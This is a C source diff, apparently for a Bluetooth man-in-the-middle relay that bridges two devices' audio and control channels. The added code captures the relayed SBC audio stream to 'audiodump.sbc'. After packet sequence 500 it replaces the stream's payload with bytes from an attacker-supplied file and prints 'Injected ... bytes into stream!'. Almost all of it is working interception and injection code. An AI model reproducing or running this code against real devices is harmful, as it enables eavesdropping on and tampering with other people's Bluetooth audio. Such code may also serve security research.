@@ -31,6 +31,9 @@
 
 #define RECV_BUF_SIZE 2048
 
+#define END_FLIP16(x) ((((x) & 0x00FF) << 8) | (((x) & 0xFF00) >> 8))
+#define END_FLIP32(x) ((END_FLIP16((x) & 0x0000FFFF) << 16) | (END_FLIP16(((x) & 0xFFFF0000) >> 16)))
+
 int detect_avdtp_start_accept_msg(uint8_t* buf, uint32_t len)
 {
 	if (len == AVDTP_START_ACCEPT_MSG_LEN)
@@ -173,6 +176,8 @@ void main()
 	uint8_t *l2cap_buf = (uint8_t*)malloc(1500);
 	FILE* test_audio_file = NULL;
 
+	FILE* haxed_audio_file = fopen("audiodump_in.sbc", "rb");
+
 	str2ba(dest1_mac, &bdaddr1);
 	str2ba(dest2_mac, &bdaddr2);
 
@@ -290,7 +295,7 @@ void main()
 	hci_disconnect(dev_sock, conn2_handle, HCI_OE_USER_ENDED_CONNECTION, 3000);
 
 	printf("Waiting for HCI to finish disconnecting...\n");
-	sleep(5);
+	sleep(1);
 
 	printf("Initiating RFCOMM Communications\n");
 /*
@@ -735,17 +740,27 @@ void main()
 
 				if (send(avdtp_sock2, recv_buf, recv_len, 0) < 0) printf("avdtp_sock2 send failed\n");
 				memset(recv_buf, 0, RECV_BUF_SIZE);
-				usleep(50000);
 			}
 		}
 
 		if (-1 != audio_sock2)
 		{
-			if ((recv_len = recv(audio_sock2, recv_buf, DEFAULT_L2CAP_MTU, 0)) > 0)
+			if ((recv_len = recv(audio_sock2, recv_buf, 608, 0)) > 0)
 			{
 				//printf("AUDIO2->AUDIO1 [%d bytes]\n", recv_len);
+				if (NULL == test_audio_file) test_audio_file = fopen("audiodump.sbc", "wb");
+				fwrite(recv_buf+12, 1, recv_len-12, test_audio_file);
+				/*printf("AUDPKT RTP: %02x %02x %d %d %08x\n", recv_buf[0], recv_buf[1], END_FLIP16(*((uint16_t*)&recv_buf[2])), END_FLIP32(*((uint32_t*)&recv_buf[4])), *((uint32_t*)&recv_buf[8]));*/
+				int sequence = END_FLIP16(*((uint16_t*)&recv_buf[2]));
+				if (sequence > 500)
+				{
+					int rb = fread(recv_buf+12, 1, recv_len - 12, haxed_audio_file);
+					printf("Injected %d bytes into stream! %02x%02x%02x%02x\n", rb, recv_buf[16], recv_buf[17], recv_buf[18], recv_buf[19]);
+				}
+
 				if (write(ag2hs_audio, recv_buf, recv_len) < 0) printf("Failed to write to ag2hs_audio\n");
 				memset(recv_buf, 0, RECV_BUF_SIZE);
+				usleep(1);
 			}
 
 			if ((recv_len = read(hs2ag_audio, recv_buf, RECV_BUF_SIZE)) > 0)
@@ -770,13 +785,14 @@ void main()
 				memset(recv_buf, 0, RECV_BUF_SIZE); 
 			}
 			
-			if ((recv_len = read(hs2ag_sco, recv_buf, RECV_BUF_SIZE)) > 0)
+			if ((recv_len = read(hs2ag_sco, recv_buf, DEFAULT_SCO_MTU)) > 0)
 			{
 				printf("HS2AG_SCO: %u bytes to SCO!\n", recv_len);
 				//printf("^");
 				if (recv_len <= DEFAULT_SCO_MTU)
 				{
 					if (err = send(sco_sock2, recv_buf, recv_len, 0) < 0) printf("sco2 send failed (%d - %s) [%d bytes]\n", errno, strerror(errno), recv_len);
+					usleep(500);
 				}
 				else
 				{
@@ -811,7 +827,6 @@ void main()
 				printf("AVCTP1->AVCTP2: %d bytes\n", recv_len);
 				write(hs2ag_avctp, recv_buf, recv_len);
 				memset(recv_buf, 0, RECV_BUF_SIZE);
-				usleep(50000);
 			}
 		}
 
@@ -847,7 +862,6 @@ void main()
 				}
 
 				memset(recv_buf, 0, RECV_BUF_SIZE);
-				usleep(50000);
 			}
 		}
 
@@ -886,7 +900,8 @@ void main()
 			memset(recv_buf, 0, RECV_BUF_SIZE);
 		}	
 
-		if ((recv_len = read(ag2hs_audio, recv_buf, RECV_BUF_SIZE)) > 0)
+		// 612 - 4b header
+		if ((recv_len = read(ag2hs_audio, recv_buf, 608)) > 0)
 		{
 			//printf("AG2HS_AUDIO: %d bytes\n", recv_len);
 
@@ -899,6 +914,9 @@ void main()
 				send_l2cap_fragmented(audio_sock1, recv_buf, recv_len, audio_sock1_omtu);
 			}
 			else*/
+
+			usleep(50);
+
 			if (recv_len <= audio_sock1_omtu)
 			{
 				if ((err = send(audio_sock1, recv_buf, recv_len, 0)) < 0) 
@@ -971,7 +989,7 @@ void main()
 			memset(recv_buf, 0, RECV_BUF_SIZE);
 		}
 
-		if ((recv_len = read(ag2hs_sco, recv_buf, RECV_BUF_SIZE)) > 0)
+		if ((recv_len = read(ag2hs_sco, recv_buf, DEFAULT_SCO_MTU)) > 0)
 		{
 //				printf("AG2HS_SCO: %u bytes to SCO!\n", recv_len);
 			if (-1 == sco_sock1)
@@ -999,7 +1017,7 @@ void main()
 					close(sco_sock1);
 					sco_sock1 = -1;
 				}
-				printf("v");
+				usleep(500);
 			}
 			else
 			{
